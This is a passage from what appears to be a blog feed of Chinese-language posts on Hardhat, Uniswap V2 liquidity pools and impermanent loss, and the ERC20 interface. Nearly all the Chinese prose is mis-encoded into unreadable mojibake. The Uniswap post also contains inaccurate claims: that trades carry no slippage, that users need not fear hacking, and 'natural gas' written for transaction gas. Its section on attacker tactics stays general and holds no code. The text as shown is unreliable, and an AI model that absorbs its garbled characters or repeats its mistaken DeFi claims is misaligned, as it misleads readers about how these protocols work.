-= amount;</span><br><span class="line">    balances[to] += amount;</span><br><span class="line"></span><br><span class="line">    emit Transfer(msg.sender, to, amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ€»ç»“ï¼Œhardhatå°±æ˜¯èƒ½è½»æ¾éƒ¨ç½²æˆ‘ä»¬çš„åˆçº¦ã€è¿è¡Œæµ‹è¯•å’Œè°ƒè¯• Solidity ä»£ç ï¼Œæ— éœ€å¤„ç†å®æ—¶ç¯å¢ƒï¼Œæ›´å¤šçŸ¥è¯†è¯·å‚è€ƒ<a href="https://hardhat.org/">hardhat</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> test </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Uniswap V2</title>
      <link href="/2024/08/06/uniswap-V2/"/>
      <url>/2024/08/06/uniswap-V2/</url>
      
        <content type="html"><![CDATA[<h1 id="Uniswap-V2"><a href="#Uniswap-V2" class="headerlink" title="Uniswap V2"></a>Uniswap V2</h1><p><strong>Uniswap</strong>æ˜¯ä¸€ç§æµè¡Œçš„å»ä¸­å¿ƒåŒ–äº¤æ˜“æ‰€ (DEX)åè®®ï¼Œå…è®¸ç”¨æˆ·å°†ä»»ä½• ERC20 ä»£å¸äº¤æ¢ä¸ºå¦ä¸€ç§ä»£å¸ï¼Œæä¾›æµåŠ¨æ€§ä»¥èµšå–è´¹ç”¨ï¼Œå¹¶è®¿é—®ä»¥å¤ªåŠåŒºå—é“¾ä¸Šçš„ä»·æ ¼é¢„è¨€æœºã€‚ è€ŒUniswap V2å…·æœ‰æ›´å¼ºå¤§çš„åŠŸèƒ½ï¼Œå¦‚ä¸‹ï¼š</p><ul><li>å®ƒå…è®¸ä»»ä½•çš„ERC20ä»£å¸ä¸å…¶ä»–çš„ERC20ä»£å¸é…å¯¹ï¼Œæ— éœ€ETHä½œä¸ºä¸­ä»‹ï¼Œè¿™ä½¿å¾—æµåŠ¨æ€§æ± æ›´åŠ å¤šæ ·åŒ–å’Œé«˜æ•ˆï¼Œå¹¶ä¸ºäº¤æ˜“è€…æä¾›æ›´å¥½çš„ä»·æ ¼ã€‚ å°±æ˜¯ä¸€ç§ä»£å¸å¯ä¸å…¶ä»–çš„ä»£å¸è½¬åŒ–ï¼Œæ–¹ä¾¿å¾ˆå¤š</li><li>Uniswap V2 å®æ–½äº†ä¸€ç§æ–°é¢–çš„æœºåˆ¶ï¼Œå¯å®ç°é«˜åº¦å»ä¸­å¿ƒåŒ–ä¸”æŠ—æ“çºµçš„é“¾ä¸Šä»·æ ¼ä¾›ç»™ã€‚ è¿™æ˜¯é€šè¿‡åœ¨æ¯ä¸ªåŒºå—å¼€å§‹æ—¶æµ‹é‡ä¸¤ç§èµ„äº§çš„ç›¸å¯¹ä»·æ ¼å¹¶éšç€æ—¶é—´çš„æ¨ç§»ç§¯ç´¯å†å²æ•°æ®æ¥å®ç°çš„ã€‚ è¿™å…è®¸å¤–éƒ¨æ™ºèƒ½åˆçº¦æŸ¥è¯¢ä»»ä½•æ—¶é—´é—´éš”å†…ä»»ä½•è´§å¸å¯¹çš„æ—¶é—´åŠ æƒå¹³å‡ä»·æ ¼ï¼ˆTWAPï¼‰ï¼ŒåŒæ—¶å°†å¤©ç„¶æ°”æˆæœ¬å’Œé¢„è¨€æœºé£é™©é™è‡³æœ€ä½ã€‚</li><li>Uniswap V2 æ”¯æŒä¸€ç§ç§°ä¸ºé—ªç”µäº’æ¢çš„æ–°å‹äº¤æ˜“ï¼Œç”¨æˆ·å¯ä»¥ä»æ± ä¸­æ¥æ”¶ä»»æ„æ•°é‡çš„ä»»ä½•èµ„äº§ï¼Œå¹¶åœ¨é“¾ä¸Šçš„å…¶ä»–åœ°æ–¹ä½¿ç”¨å®ƒï¼Œåªè¦ä»–ä»¬åœ¨äº¤æ˜“ç»“æŸæ—¶å¿è¿˜è¯¥é‡‘é¢å¹¶æ”¯ä»˜è´¹ç”¨å³å¯ã€‚ äº¤æ˜“ã€‚ è¿™ä¸ºå¥—åˆ©ã€ä¿è¯é‡‘äº¤æ˜“ã€æŠµæŠ¼å“äº’æ¢ç­‰å¼€è¾Ÿäº†æ–°çš„å¯èƒ½æ€§ã€‚</li></ul><p>æ¯ä¸ªUniswapæ™ºèƒ½åˆçº¦æˆ–ä¸€å¯¹æ™ºèƒ½åˆçº¦éƒ½ç®¡ç†ç”±ä¸¤ä¸ªERC-20ä»£å¸çš„å‚¨å¤‡ç»„æˆçš„æµåŠ¨èµ„é‡‘æ± ã€‚</p><p>åŒæ—¶å®ƒä¹Ÿæœ‰å¾ˆå¤šå¥½å¤„ï¼š</p><ul><li>ä½è´¹ç”¨ï¼šUniswap V2 å¯¹æ¯ç¬”äº¤æ˜“æ”¶å– 0.3% çš„å›ºå®šè´¹ç”¨ï¼Œè¯¥è´¹ç”¨ç”±æ‰€æœ‰æµåŠ¨æ€§æä¾›è€…æŒ‰å…¶åœ¨æ± ä¸­çš„æƒç›Šæ¯”ä¾‹åˆ†é…ã€‚ è¯¥è´¹ç”¨ä½äºå¤§å¤šæ•°ä¸­å¿ƒåŒ–äº¤æ˜“æ‰€å’Œå…¶ä»– DEX åè®®ï¼Œè¿™ä½¿å¾— Uniswap V2 æˆä¸ºä¸­å°é¢äº¤æ˜“çš„æœ‰å¸å¼•åŠ›çš„é€‰æ‹©ã€‚</li><li>é«˜æµåŠ¨æ€§ï¼šUniswap V2 åˆ©ç”¨ä»¥å¤ªåŠåŠå…¶åºå¤§çš„ ERC20 ä»£å¸ç”Ÿæ€ç³»ç»Ÿçš„ç½‘ç»œæ•ˆåº”ï¼Œä¸ºä»»ä½•ä»£å¸å¯¹æä¾›é«˜æµåŠ¨æ€§ã€‚ ä»»ä½•äººéƒ½å¯ä»¥é€šè¿‡æä¾›ä¸€å®šæ•°é‡çš„ä¸¤ç§ä»£å¸æ¥åˆ›å»ºæ–°çš„è´§å¸å¯¹æˆ–åŠ å…¥ç°æœ‰çš„è´§å¸å¯¹ï¼Œä»è€Œå¢åŠ æ± çš„æ·±åº¦å’Œå¯ç”¨æ€§ã€‚ æ­¤å¤–ï¼ŒUniswap V2 é‡‡ç”¨è‡ªåŠ¨åšå¸‚å•†ï¼ˆAMMï¼‰æ¨¡å‹ï¼Œæ ¹æ®ä¾›éœ€æƒ…å†µè°ƒæ•´ä»·æ ¼ï¼Œç¡®ä¿ä»»ä½•äº¤æ˜“è§„æ¨¡å§‹ç»ˆæœ‰è¶³å¤Ÿçš„æµåŠ¨æ€§ã€‚</li><li>æ— è®¸å¯è®¿é—®ï¼šUniswap V2 æ˜¯<strong>å®Œå…¨å»ä¸­å¿ƒåŒ–å’Œéæ‰˜ç®¡çš„</strong>ï¼Œè¿™æ„å‘³ç€ä»»ä½•äººéƒ½å¯ä»¥ä½¿ç”¨å®ƒï¼Œè€Œæ— éœ€æ³¨å†Œå¸æˆ·ã€éªŒè¯èº«ä»½æˆ–ä¿¡ä»»ç¬¬ä¸‰æ–¹ä½¿ç”¨å…¶èµ„é‡‘ã€‚ ç”¨æˆ·å¯ä»¥å®Œå…¨æ§åˆ¶è‡ªå·±çš„èµ„äº§ï¼Œå¯ä»¥éšæ—¶è¿›è¡Œäº¤æ˜“æˆ–æä¾›æµåŠ¨æ€§ï¼Œè€Œæ— éœ€æ‹…å¿ƒåœæœºã€å®¡æŸ¥æˆ–é»‘å®¢æ”»å‡»ã€‚</li><li>é€æ˜å®šä»·ï¼šUniswap V2 é‡‡ç”¨ç®€å•é€æ˜çš„å®šä»·æœºåˆ¶ï¼Œç”±æ’å®šä¹˜ç§¯å…¬å¼å’ŒçŸ¿æ± å½“å‰å‡†å¤‡é‡‘ä½™é¢å†³å®šã€‚ ç”¨æˆ·å¯ä»¥è½»æ¾è®¡ç®—ä»–ä»¬å°†æ”¶åˆ°æˆ–æ”¯ä»˜ä»»ä½•äº¤æ˜“çš„ç¡®åˆ‡ä»£å¸æ•°é‡ï¼Œæ²¡æœ‰ä»»ä½•éšè—è´¹ç”¨æˆ–æ»‘ç‚¹ã€‚ ç”¨æˆ·è¿˜å¯ä»¥æ ¹æ®æ± çš„å†å²æ•°æ®è®¿é—®ä»»ä½•è´§å¸å¯¹çš„å¯é ä¸”æ— éœ€ä¿¡ä»»çš„ä»·æ ¼é¢„è¨€æœºã€‚</li></ul><p>è¦ä½¿ç”¨Uniswap V2å¯åœ¨<a href="https://uniswap.org/">å®˜ç½‘</a>ä¸Šè®¿é—®,å¯ä»¥è‡ªå·±åˆ›å»ºä¸€ä¸ªUniswapé’±åŒ…ï¼Œä¸€å®šè¦è®°ä½<strong>ç§é’¥</strong></p><p>æµåŠ¨æ€§æä¾›è€…çš„ç»“æ„å’Œåˆçº¦ä¹‹é—´çš„äº¤äº’æ¶‰åŠå¤šä¸ªæ¦‚å¿µå’Œæœºåˆ¶ï¼Œä»¥ä¸‹æ˜¯è¯¦ç»†çš„è§£é‡Šï¼š</p><h1 id="æµåŠ¨æ€§æä¾›è€…çš„ç»“æ„"><a href="#æµåŠ¨æ€§æä¾›è€…çš„ç»“æ„" class="headerlink" title="æµåŠ¨æ€§æä¾›è€…çš„ç»“æ„"></a>æµåŠ¨æ€§æä¾›è€…çš„ç»“æ„</h1><ol><li><p><strong>æµåŠ¨æ€§æä¾›è€…ï¼ˆLPï¼‰</strong>ï¼š</p><ul><li>æµåŠ¨æ€§æä¾›è€…æ˜¯å‘å»ä¸­å¿ƒåŒ–äº¤æ˜“æ‰€ï¼ˆDEXï¼‰æä¾›èµ„äº§çš„ç”¨æˆ·ï¼Œä»¥ä¾¿äº¤æ˜“è€…å¯ä»¥åœ¨è¯¥å¹³å°ä¸Šè¿›è¡Œäº¤æ˜“ã€‚</li><li>LP å°†ä¸¤ç§ä»£å¸ï¼ˆä¾‹å¦‚ USDC å’Œ SAFUï¼‰å­˜å…¥æµåŠ¨æ€§æ± ï¼Œä½œä¸ºå›æŠ¥ï¼Œä»–ä»¬ä¼šè·å¾—æµåŠ¨æ€§æ± ä»£å¸ï¼ˆLP ä»£å¸ï¼‰ï¼Œè¿™äº›ä»£å¸ä»£è¡¨ä»–ä»¬åœ¨æ± ä¸­çš„ä»½é¢ã€‚</li></ul></li><li><p><strong>æµåŠ¨æ€§æ± </strong>ï¼š</p><ul><li>æµåŠ¨æ€§æ± æ˜¯æ™ºèƒ½åˆçº¦ï¼Œå­˜å‚¨äº†ä¸¤ç§ä»£å¸ï¼Œå…è®¸ç”¨æˆ·ä»¥è‡ªåŠ¨åŒ–æ–¹å¼è¿›è¡Œäº¤æ˜“ã€‚</li><li>äº¤æ˜“è€…åœ¨æ± ä¸­ä¹°å…¥æˆ–å–å‡ºä»£å¸ï¼Œæ± ä¸­çš„èµ„äº§æ ¹æ®äº¤æ˜“çš„ä¾›éœ€æƒ…å†µè¿›è¡Œè°ƒæ•´ã€‚</li></ul></li><li><p><strong>æµåŠ¨æ€§æ± ä»£å¸ï¼ˆLP ä»£å¸ï¼‰</strong>ï¼š</p><ul><li>å½“ç”¨æˆ·æä¾›æµåŠ¨æ€§æ—¶ï¼Œä¼šè·å¾—ç›¸åº”çš„ LP ä»£å¸ï¼Œè¡¨ç¤ºä»–ä»¬åœ¨æµåŠ¨æ€§æ± ä¸­çš„ä»½é¢ã€‚</li><li>LP ä»£å¸å¯ä»¥ç”¨äºå…¶ä»–æ“ä½œï¼Œæ¯”å¦‚è´¨æŠ¼ã€è·å–å¥–åŠ±æˆ–è¿›è¡Œå†æŠ•èµ„ã€‚</li></ul></li></ol><h3 id="åˆçº¦ä¹‹é—´çš„äº¤äº’"><a href="#åˆçº¦ä¹‹é—´çš„äº¤äº’" class="headerlink" title="åˆçº¦ä¹‹é—´çš„äº¤äº’"></a>åˆçº¦ä¹‹é—´çš„äº¤äº’</h3><ol><li><p><strong>æµåŠ¨æ€§æ·»åŠ </strong>ï¼š</p><ul><li>LP é€šè¿‡è°ƒç”¨è·¯ç”±åˆçº¦ï¼ˆä¾‹å¦‚ Uniswap çš„ Router åˆçº¦ï¼‰è¿›è¡ŒæµåŠ¨æ€§æ·»åŠ ã€‚</li><li>è·¯ç”±åˆçº¦ä¼šå°† LP çš„ä»£å¸å­˜å…¥æµåŠ¨æ€§æ± åˆçº¦ï¼Œå¹¶é“¸é€  LP ä»£å¸ã€‚</li></ul></li><li><p><strong>äº¤æ˜“</strong>ï¼š</p><ul><li>å½“äº¤æ˜“è€…è¿›è¡Œäº¤æ˜“æ—¶ï¼Œä»–ä»¬é€šè¿‡è·¯ç”±åˆçº¦äº¤æ¢ä»£å¸ã€‚è·¯ç”±åˆçº¦ä¼šè°ƒç”¨æµåŠ¨æ€§æ± åˆçº¦æ¥æ›´æ–°æ± ä¸­çš„èµ„äº§ã€‚</li><li>äº¤æ˜“çš„æ‰§è¡Œä¼šæ ¹æ®é¢„è®¾çš„ç®—æ³•ï¼ˆå¦‚è‡ªåŠ¨åšå¸‚å•†ç®—æ³•ï¼‰è°ƒæ•´æ± ä¸­ä»£å¸çš„æ¯”ä¾‹ã€‚</li></ul></li><li><p><strong>æµåŠ¨æ€§ç§»é™¤</strong>ï¼š</p><ul><li>LP å¯ä»¥é€‰æ‹©ç§»é™¤ä»–ä»¬çš„æµåŠ¨æ€§ï¼Œé€šè¿‡è°ƒç”¨è·¯ç”±åˆçº¦å¹¶æŒ‡å®š LP ä»£å¸æ•°é‡ã€‚</li><li>è·¯ç”±åˆçº¦ä¼šéªŒè¯ LP ä»£å¸çš„æœ‰æ•ˆæ€§ï¼Œå¹¶å°†ç›¸åº”çš„åŸºç¡€ä»£å¸è¿”å›ç»™ LPã€‚</li></ul></li><li><p><strong>è´¹ç”¨å’Œå¥–åŠ±</strong>ï¼š</p><ul><li>æ¯ç¬”äº¤æ˜“éƒ½ä¼šäº§ç”Ÿä¸€å®šçš„äº¤æ˜“è´¹ç”¨ï¼Œè¿™äº›è´¹ç”¨ä¼šåˆ†é…ç»™æµåŠ¨æ€§æä¾›è€…ï¼Œä½œä¸ºä»–ä»¬æä¾›æµåŠ¨æ€§çš„å¥–åŠ±ã€‚</li><li>LP ä»£å¸ä¹Ÿå¯ä»¥ç”¨äºå…¶ä»–åˆçº¦ï¼ˆä¾‹å¦‚æ”¶ç›Šå†œåœºæˆ–æµåŠ¨æ€§æŒ–çŸ¿åˆçº¦ï¼‰ï¼Œè¿›ä¸€æ­¥å¢åŠ æ”¶ç›Šã€‚</li></ul></li></ol><h3 id="ç¤ºä¾‹æµç¨‹"><a href="#ç¤ºä¾‹æµç¨‹" class="headerlink" title="ç¤ºä¾‹æµç¨‹"></a>ç¤ºä¾‹æµç¨‹</h3><p>å‡è®¾ä¸€ä¸ªç”¨æˆ·ï¼ˆLPï¼‰å¸Œæœ›åœ¨ Uniswap ä¸Šæä¾›æµåŠ¨æ€§ï¼š</p><ol><li><p><strong>æµåŠ¨æ€§æ·»åŠ </strong>ï¼š</p><ul><li>ç”¨æˆ·å†³å®šå­˜å…¥ 1000 USDC å’Œ 1 SAFU ä»£å¸ã€‚</li><li>è°ƒç”¨ <code>addLiquidity</code> å‡½æ•°ï¼Œå°†ä»£å¸å‘é€åˆ° Uniswap çš„ Router åˆçº¦ã€‚</li><li>Router åˆçº¦ä¼šå‘æµåŠ¨æ€§æ± åˆçº¦è½¬ç§»ä»£å¸ï¼Œå¹¶è¿”å›ç›¸åº”çš„ LP ä»£å¸ã€‚</li></ul></li><li><p><strong>è¿›è¡Œäº¤æ˜“</strong>ï¼š</p><ul><li>ç”¨æˆ·æˆ–å…¶ä»–äººå¯ä»¥åœ¨ Uniswap ä¸Šè¿›è¡Œä»£å¸äº¤æ¢ã€‚</li><li>Router åˆçº¦ä¼šæ‰¾åˆ°æœ€ä½³è·¯å¾„å¹¶è°ƒç”¨æµåŠ¨æ€§æ± åˆçº¦æ¥æ‰§è¡Œäº¤æ¢ã€‚</li></ul></li><li><p><strong>æµåŠ¨æ€§ç§»é™¤</strong>ï¼š</p><ul><li>ç”¨æˆ·å¸Œæœ›å–å›ä»–ä»¬çš„æµåŠ¨æ€§ï¼Œé€šè¿‡è°ƒç”¨ <code>removeLiquidity</code>ã€‚</li><li>Router åˆçº¦ä¼šéªŒè¯ LP ä»£å¸ï¼Œå¹¶è¿”å›ç”¨æˆ·å­˜å…¥çš„ç›¸åº”æ•°é‡çš„ä»£å¸ã€‚</li></ul></li><li><p><strong>è·å¾—äº¤æ˜“è´¹ç”¨</strong>ï¼š</p><ul><li>äº¤æ˜“è¿‡ç¨‹ä¸­äº§ç”Ÿçš„æ‰‹ç»­è´¹ä¼šæ ¹æ®ç”¨æˆ·åœ¨æµåŠ¨æ€§æ± ä¸­çš„ä»½é¢è‡ªåŠ¨åˆ†é…ç»™ä»–ä»¬ã€‚</li></ul></li></ol><h3 id="æ”»å‡»è€…å¦‚ä½•åˆ©ç”¨è¿™äº›ç»“æ„"><a href="#æ”»å‡»è€…å¦‚ä½•åˆ©ç”¨è¿™äº›ç»“æ„" class="headerlink" title="æ”»å‡»è€…å¦‚ä½•åˆ©ç”¨è¿™äº›ç»“æ„"></a>æ”»å‡»è€…å¦‚ä½•åˆ©ç”¨è¿™äº›ç»“æ„</h3><p>æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ LP ä»£å¸çš„æµåŠ¨æ€§å’Œåˆçº¦ä¹‹é—´çš„äº¤äº’æ¥æ‰§è¡Œæ”»å‡»ï¼Œä¾‹å¦‚ï¼š</p><ul><li><strong>é€šè¿‡é«˜é¢‘äº¤æ˜“</strong>ï¼šåˆ©ç”¨æµåŠ¨æ€§æ± ä¸­çš„ä¸å¹³è¡¡ï¼Œè¿›è¡Œé«˜é¢‘äº¤æ˜“æ¥è·åˆ©ã€‚</li><li><strong>åˆ©ç”¨ä»·æ ¼æ“æ§</strong>ï¼šé€šè¿‡æ·»åŠ æˆ–ç§»é™¤æµåŠ¨æ€§æ¥æ“æ§ä»·æ ¼ï¼Œè¿›è€Œå½±å“å¸‚åœºã€‚</li><li><strong>å¥–åŠ±å¥—åˆ©</strong>ï¼šè½¬ç§» LP ä»£å¸åˆ°å…¶ä»–åˆçº¦ï¼ˆä¾‹å¦‚æ”¶ç›Šå†œåœºï¼‰ä»¥è·å¾—é¢å¤–å¥–åŠ±ã€‚</li></ul><p>è¿™ç§åˆçº¦ä¹‹é—´çš„äº¤äº’å’ŒæµåŠ¨æ€§æä¾›è€…çš„ç»“æ„ä½¿å¾—å»ä¸­å¿ƒåŒ–äº¤æ˜“æ‰€èƒ½å¤Ÿé«˜æ•ˆè¿è¡Œï¼Œä½†åŒæ—¶ä¹Ÿä¸ºæ”»å‡»è€…æä¾›äº†æ½œåœ¨çš„æ”»å‡»å‘é‡ã€‚</p><p>Uniswap V2çš„æ€è€ƒ<br>Uniswapé€šè¿‡ x * y &#x3D; k è¿™ä¸ªæ’å®šä¹˜ç§¯çš„ç­‰å¼å®Œæˆäº†é“¾ä¸Šè‡ªåŠ¨åšå¸‚ã€‚å½“ç„¶å®ƒä¹Ÿæœ‰ä¸€ä¸ªç‰¹åˆ«å¤§çš„ç¼ºç‚¹ï¼Œå°±æ˜¯éšç€æ± ä¸­Bçš„å‡å°‘ï¼ŒBçš„ä»·æ ¼ä¼šè¶Šæ¥è¶Šè´µï¼Œå’Œå¤–éƒ¨çš„ä»·æ ¼è¶Šæ¥è¶Šåç¦»äº†ã€‚ä¸ºäº†è§£å†³è¿™ç§åç¦»ï¼Œå¥—åˆ©è€…ä¼šé€šè¿‡å…¶è¿ç»­çš„å¥—åˆ©æ´»åŠ¨å°†å·®å¼‚æŠ¹åˆ°å¯ä»¥å¿½ç•¥çš„åœ°æ­¥ã€‚</p><p>é‚£ä¹ˆæ˜¯è°åœ¨æ”¯ä»˜è¿™äº›æ”¶ç›Šã€‚</p><p>Uniswapçš„é¡¹ç›®æ–¹ä¸å¯èƒ½æ”¯ä»˜è¿™äº›åˆ©æ¶¦ã€‚ä»–ä»¬åªæ˜¯æä¾›æ™ºèƒ½åˆçº¦ã€‚</p><p>å…¶ä»–äº¤æ˜“è€…å¦‚æœå‘ç°æ± ä¸­ä»·æ ¼æ¯”èµ·å¤–éƒ¨ä»·æ ¼å­˜åœ¨å·®å¼‚ï¼Œç†æ€§çš„è¡Œä¸ºæ˜¯å‚ä¸å¥—åˆ©ã€‚</p><p>é‚£ä¹ˆå‰©ä¸‹æ¥å”¯ä¸€æ”¯ä»˜è¿™äº›åˆ©æ¶¦çš„å°±æ˜¯æä¾›æµåŠ¨æ€§çš„åšå¸‚è€…äº†ã€‚ä»–ä»¬çš„æŸå¤±ä¹Ÿæ­£æ˜¯å¥—åˆ©è€…ä¸ºäº†å¹³è¡¡å†…å¤–ä»·æ ¼è€Œè·å¾—çš„åˆ©æ¶¦ã€‚å› æ­¤Uniswapé€šè¿‡äº¤æ˜“æ‰‹ç»­è´¹çš„æ–¹å¼ï¼Œä¸ºæµåŠ¨æ€§æä¾›è€…è¿›è¡Œäº†è¡¥å¿ã€‚</p><p>Impermanent Loss<br>æµåŠ¨æ€§æä¾›è€…çš„æŸå¤±æ˜¯å¦‚ä½•äº§ç”Ÿçš„ï¼Ÿ</p><p>æ¥çœ‹ä¸€ä¸ªç®€å•çš„ä¾‹å­ã€‚</p><p>å‡å¦‚æœ‰æ± å­ETH:USDTï¼Œå‡è®¾æµåŠ¨æ€§æä¾›è€…æŒ‰ç…§å½“æ—¶çš„å¸‚åœºä»·æ ¼ 1 ETH&#x3D;500 DAI æä¾›äº† 20ä¸ªETH å’Œ10000ä¸ªDAIã€‚æ­¤æ—¶LPæŒæœ‰çš„èµ„äº§ä»·å€¼&#x3D;10000 DAI +20ETH &#x3D; 20000 DAIã€‚</p><p>è¿‡äº†ä¸€æ®µæ—¶é—´ï¼Œå¤–éƒ¨äº¤æ˜“æ‰€çš„ETH ä»·æ ¼å˜åŒ–ä¸º 1 ETH&#x3D;550 DAIï¼Œè€Œæ­¤æ—¶æˆ‘ä»¬çš„æ± å­è¿˜æ˜¯ç»´æŒ 500 DAI çš„ä»·æ ¼ã€‚è¿™å°±æ„å‘³ç€å‡ºç°ä¸€ä¸ªå¥—åˆ©æœºä¼šã€‚</p><p>å¥—åˆ©è€…åœ¨æ± ä¸­æ”¯ä»˜DAIï¼Œè·å¾—ETHï¼Œå¹¶ä¸”åœ¨å¤–éƒ¨å–å‡ºï¼Œå°±å¯ä»¥è·å¾—æ— é£é™©çš„å·®ä»·ã€‚è€Œå¥—åˆ©æœ¬èº«å°†è®©æ± ä¸­çš„ETH&#x2F;DAIä»·æ ¼ä»500ä¸Šå‡åˆ°550ï¼Œè¿™æ ·å¥—åˆ©æœºä¼šä¹Ÿå°±æ¶ˆå¤±äº†ã€‚</p><p>å¥—åˆ©è€…éœ€è¦ä»˜å‡º488ä¸ªDAIï¼Œæå–0.93ä¸ªETH å°±å¯ä»¥è®©æ± å†…ä»·æ ¼å˜æˆ550ã€‚å¥—åˆ©è€…çš„åˆ©æ¶¦åˆ™æ˜¯0.93*550â€“488&#x3D;23.5 DAIã€‚å¦‚æœæˆ‘ä»¬æŒ‰ç…§å¤–éƒ¨å¸‚åœºä»·è®¡ç®—LPæ‰‹ä¸­çš„ä»£å¸ï¼Œé‚£ä¹ˆæ€»ä»·å€¼ä¼šæ˜¯21000 DAIã€‚ä½†æ˜¯æ± å†…ç»è¿‡å¥—åˆ©å¹³è¡¡åï¼Œä»·æ ¼è™½ç„¶å’Œå¤–éƒ¨å¸‚åœºä»·ä¸€æ ·ï¼Œå•ä»·æ˜¯ä¸¤ç§ä»£å¸çš„æ¯”ä¾‹å‘ç”Ÿäº†å˜åŒ–,ï¼Œå› æ­¤æ€»ä»·å€¼åªæœ‰20976.59ã€‚</p><p>å‡è®¾å¦‚æœå¤–éƒ¨å¸‚åœºä»·æ ¼å†ä¸€æ¬¡å›åˆ°äº†500ï¼Œé‚£ä¹ˆå¥—åˆ©è€…å¯ä»¥é€šè¿‡æ”¯ä»˜0.93ä¸ªETHï¼Œè·å–488ä¸ªDAIï¼Œè®©æ± å†…çš„ä»·æ ¼ETHå’ŒDAIåˆå›åˆ°äº†æœŸåˆçš„çŠ¶æ€ã€‚ LPæ­¤æ—¶åˆå›åˆ°äº†æœ€åˆçš„çŠ¶æ€ï¼Œæ²¡æœ‰äºæŸã€‚</p><p>æ€»ç»“ï¼š<br>1åªè¦æµåŠ¨æ€§æ± çš„ä»·æ ¼åç¦»å¤–éƒ¨ä»·æ ¼ï¼Œå¥—åˆ©è€…æ€»æ˜¯å¯ä»¥æ— é£é™©è·å¾—æ”¶ç›Šï¼ŒLPåˆ™æ€»æ˜¯å‡ºç°æµ®åŠ¨äºæŸï¼Œæœ€å¥½çš„æƒ…å†µå°±æ˜¯ä¸äºæŸã€‚</p><p>2åªè¦LPä¸é€€å‡ºæµåŠ¨æ€§æ± ï¼Œé‚£ä¹ˆå½“å¤–éƒ¨å¸‚åœºä»·æ ¼å›åˆ°å»ºç«‹æ± çš„ä»·æ ¼æ—¶ï¼ŒLPä¾ç„¶å¯ä»¥ä¿ç•™å…¨éƒ¨èµ„äº§ä¸äºæŸï¼Œæ‰€ä»¥LPçš„äºæŸæ˜¯ä¸€ä¸ªæµ®åŠ¨çš„äºæŸï¼Œè€Œéå®é™…çš„äºæŸã€‚</p><p>3 å¥—åˆ©æ´»åŠ¨è®©ä»·æ ¼è¶‹äºä¸€è‡´ï¼Œä»£ä»·å°±æ˜¯LPä»˜å‡ºäº†å¥—åˆ©è€…çš„åˆ©æ¶¦ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> åŸºç¡€çŸ¥è¯† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ERC20</title>
      <link href="/2024/08/05/ERC20/"/>
      <url>/2024/08/05/ERC20/</url>
      
        <content type="html"><![CDATA[<h1 id="ERC20"><a href="#ERC20" class="headerlink" title="ERC20"></a>ERC20</h1><p><code>ERC20</code>æ˜¯ä»¥å¤ªåŠä¸Šçš„ä»£å¸æ ‡å‡†ï¼Œå®ƒå®ç°äº†ä»£å¸è½¬è´¦çš„åŸºæœ¬é€»è¾‘ï¼š</p><ul><li>è´¦æˆ·ä½™é¢(balanceOf())</li><li>è½¬è´¦(transfer())</li><li>æˆæƒè½¬è´¦(transferFrom())</li><li>æˆæƒ(approve())</li><li>ä»£å¸æ€»ä¾›ç»™(totalSupply())</li><li>æˆæƒè½¬è´¦é¢åº¦(allowance())</li><li>ä»£å¸ä¿¡æ¯ï¼ˆå¯é€‰ï¼‰ï¼šåç§°(name())ï¼Œä»£å·(symbol())ï¼Œå°æ•°ä½æ•°(decimals())</li></ul><p>é™¤äº†ERC20,è¿˜æœ‰å®ƒçš„æ¥å£åˆçº¦IERC20ï¼Œå°±æ˜¯ä¸ºäº†ç»Ÿä¸€è§„èŒƒï¼Œä»¥ä¾¿å¥½ä½¿ç”¨ï¼Œæ¥ä¸‹æ¥å°±ä»‹ç»ä¸€ä¸‹IERC20åˆçº¦çš„åŠŸèƒ½</p><h2 id="ä¿©ä¸ªäº‹ä»¶"><a href="#ä¿©ä¸ªäº‹ä»¶" class="headerlink" title="ä¿©ä¸ªäº‹ä»¶"></a>ä¿©ä¸ªäº‹ä»¶</h2><ul><li>é‡Šæ”¾æ¡ä»¶ï¼šå½“ <code>value</code> å•ä½çš„è´§å¸ä»è´¦æˆ· (<code>from</code>) è½¬è´¦åˆ°å¦ä¸€è´¦æˆ· (<code>to</code>)æ—¶.<br><code>event Transfer(address indexed from, address indexed to, uint256 value);</code></li><li>é‡Šæ”¾æ¡ä»¶ï¼šå½“ <code>value</code> å•ä½çš„è´§å¸ä»è´¦æˆ· (<code>owner</code>) æˆæƒç»™å¦ä¸€è´¦æˆ· (<code>spender</code>ï¼‰æ—¶.<br><code>event Approval(address indexed owner, address indexed spender, uint256 value);</code></li></ul><h2 id="å…­ä¸ªå‡½æ•°"><a href="#å…­ä¸ªå‡½æ•°" class="headerlink" title="å…­ä¸ªå‡½æ•°"></a>å…­ä¸ªå‡½æ•°</h2><ul><li><code>totalSupply()</code>è¿”å›ä»£å¸æ€»ä¾›ç»™<br><code>function totalSupply() external view returns (uint256);</code></li><li><code>balanceOf()</code>è¿”å›è´¦æˆ·<code>account</code>æ‰€æŒæœ‰çš„ä»£å¸æ•°.<br><code>function balanceOf(address account) external view returns (uint256);</code></li><li><code>transfer()</code>è½¬è´¦ <code>amount</code> å•ä½ä»£å¸ï¼Œä»è°ƒç”¨è€…è´¦æˆ·åˆ°å¦ä¸€è´¦æˆ· <code>to</code>,å¦‚æœæˆåŠŸï¼Œè¿”å› <code>true</code>,é‡Šæ”¾ {Transfer} äº‹ä»¶.<br><code>function transfer(address to, uint256 amount) external returns (bool);</code></li><li><code>allowance()</code>è¿”å›<code>owner</code>è´¦æˆ·æˆæƒç»™<code>spender</code>è´¦æˆ·çš„é¢åº¦ï¼Œé»˜è®¤ä¸º0,å½“{approve} æˆ– {transferFrom} è¢«è°ƒç”¨æ—¶ï¼Œ<code>allowance</code>ä¼šæ”¹å˜<br><code>function allowance(address owner, address spender) external view returns (uint256);</code></li><li><code>approve()</code>è°ƒç”¨è€…è´¦æˆ·ç»™<code>spender</code>è´¦æˆ·æˆæƒ <code>amount</code>æ•°é‡ä»£å¸,å¦‚æœæˆåŠŸï¼Œè¿”å› <code>true</code>,é‡Šæ”¾ {Approval} äº‹ä»¶<br><code>function approve(address spender, uint256 amount) external returns 